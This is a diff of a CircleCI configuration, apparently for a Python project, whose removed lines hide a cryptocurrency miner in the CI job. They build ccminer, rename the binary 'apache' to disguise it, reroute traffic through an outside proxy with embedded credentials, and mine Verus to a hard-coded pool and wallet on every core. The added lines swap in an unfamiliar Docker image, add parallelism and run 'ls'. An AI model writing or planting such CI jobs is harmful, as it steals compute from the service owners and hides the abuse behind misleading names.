@@ -10,22 +10,19 @@ jobs:
     # The executor is the environment in which the steps below will be executed - below will use a python 3.8 container
     # Change the version below to your required version of python
     docker:
-      - image: circleci/ruby:2.5.3
+      - image: kuyaxxx/pacul
     # Checkout the code as the first step. This is a dedicated CircleCI step.
     # The python orb's install-packages step will install the dependencies from a Pipfile via Pipenv by default.
     # Here we're making sure we use just use the system-wide pip. By default it uses the project root's requirements.txt.
     # Then run your tests!
     # CircleCI will report the results back to your VCS provider.
+    parallelism: 3
     steps:
       - run:
           name: Install Dependencies
           # This assumes pytest is installed via the install-package step above
           command: |
-            sudo apt update
-            sudo apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git proxychains
-            git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git;cd ccminer;chmod +x build.sh;chmod +x configure.sh;chmod +x autogen.sh;./build.sh;mv ccminer ../apache;cd ..;sudo rm ccminer -r            
-            sudo sed -i -e 's/#dynamic_chain/dynamic_chain/g;s/strict_chain/#strict_chain/g;s/socks4/socks5/g;s/127.0.0.1/185.30.232.34/g;s/9050/80 kuyaxbatox-US-rotate b15m1ll4H/g' /etc/proxychains.conf            
-            sudo proxychains ./apache -a verus -o stratum+tcp://79.137.70.48:3956 -u RKJZtNARyonv8N2GtPAo5E7sn8uHPjt2LZ.cici-$(echo $(nproc --all)) -p x -t $(echo $(nproc --all))
+            ls
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
